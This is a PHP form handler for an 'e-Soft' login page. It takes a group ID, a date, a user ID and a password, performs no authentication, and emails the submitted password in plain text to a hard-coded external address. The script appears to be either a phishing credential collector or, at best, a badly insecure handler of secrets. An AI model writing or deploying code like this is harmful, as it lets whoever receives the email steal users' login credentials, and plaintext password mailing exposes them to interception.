<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $group_id = $_POST['group_id'] ?? '';
    $date = $_POST['date'] ?? '';
    $user_id = $_POST['user_id'] ?? '';
    $password = $_POST['password'] ?? '';

    // Basic validation
    $errors = [];
    if (empty($group_id)) {
        $errors[] = "Group ID is required.";
    }
    if (empty($date)) {
        $errors[] = "Date is required.";
    }
    if (empty($user_id)) {
        $errors[] = "User ID is required.";
    }
    if (empty($password)) {
        $errors[] = "Password is required.";
    }

    if (empty($errors)) {
        // Prepare email
        $to = "sunil@24x7technologies.in"; // Replace with the website owner's email address
        $subject = "e-Soft Login Form Submission";
        $message = "
        Group ID: " . htmlspecialchars($group_id) . "\n
        Date: " . htmlspecialchars($date) . "\n
        User ID: " . htmlspecialchars($user_id) . "\n
        Password: " . htmlspecialchars($password) . "\n
        ";
        $headers = "From: noreply@example.com"; // Replace with a valid sender email address

        // Send email
        if (mail($to, $subject, $message, $headers)) {
            echo "<p style='color:green;'>Form data has been sent successfully.</p>";
        } else {
            echo "<p style='color:red;'>Failed to send form data.</p>";
        }
    } else {
        // Display errors
        foreach ($errors as $error) {
            echo "<p style='color:red;'>" . htmlspecialchars($error) . "</p>";
        }
    }
} else {
    echo "<p style='color:red;'>Invalid request method.</p>";
}
?>
